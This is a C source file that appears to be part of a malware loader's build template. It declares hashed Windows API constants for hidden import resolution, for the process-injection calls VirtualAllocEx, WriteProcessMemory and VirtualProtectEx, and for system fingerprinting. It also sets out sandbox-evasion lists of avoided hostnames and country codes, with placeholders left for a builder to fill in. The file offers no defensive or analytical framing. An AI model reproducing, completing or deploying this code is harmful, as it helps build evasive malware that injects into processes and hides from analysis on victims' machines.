#include "objhash.h"

// Function to check if an ObjHash is valid (non-null)
// An ObjHash is considered valid if any of its fields are non-zero.
bool is_objhash(ObjHash obj_hash) {
    // A null ObjHash is defined as {0, 0, false}
    return (obj_hash.value != 0 || obj_hash.rotation_value != 0 || obj_hash.is_rotation_right != false);
}

const ObjHash USER32_HASH = %MODHASH__user32.dll%;
const ObjHash KERNEL32_HASH = %MODHASH__kernel32.dll%;

// Hashes for function names
const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
const ObjHash GET_PROC_ADDRESS_HASH = %FCTHASH__GetProcAddress%;
const ObjHash QUERY_INFORMATION_PROCESS_HASH = %FCTHASH__NtQueryInformationProcess%;

// Hashes for system information functions
const ObjHash GET_COMPUTER_NAME_HASH = %FCTHASH__GetComputerNameA%;
const ObjHash GET_DISK_FREE_SPACE_HASH = %FCTHASH__GetDiskFreeSpaceExA%;
const ObjHash GET_SYSTEM_INFO_HASH = %FCTHASH__GetSystemInfo%;
const ObjHash GET_KEYBOARD_LAYOUT_HASH = %FCTHASH__GetKeyboardLayout%;
const ObjHash GLOBAL_MEMORY_STATUS_HASH = %FCTHASH__GlobalMemoryStatusEx%;

// Hashes for language and locale functions
const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH = %FCTHASH__GetSystemDefaultLangID%;
const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH = %FCTHASH__GetSystemDefaultLCID%;

// Hashes for memory and thread management functions
const ObjHash VIRTUAL_ALLOC_HASH = %FCTHASH__VirtualAllocEx%;
const ObjHash WRITE_MEMORY_HASH = %FCTHASH__WriteProcessMemory%;
const ObjHash VIRTUAL_PROTECT_HASH = %FCTHASH__VirtualProtectEx%;

// statical arrays and sizes for avoided hostnames and countries
const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %SANDBOX__TARGET_HOSTNAME%;
const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[] = {
    %SANDBOX__AVOID_HOSTNAME%
};

// const ObjHash AVOIDED_CPU_NAME_HASHES[] = {
//     %SANDBOX__AVOID_CPU_NAME%
// };

// List of country codes to avoid
const uint16_t AVOIDED_COUNTRIES[] = {
    %SANDBOX__AVOID_COUNTRIES%
};

// Sizes of the avoided hostname and country arrays
const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE = sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES) / sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES[0]);
const size_t AVOIDED_COUNTRIES_SIZE = sizeof(AVOIDED_COUNTRIES) / sizeof(AVOIDED_COUNTRIES[0]);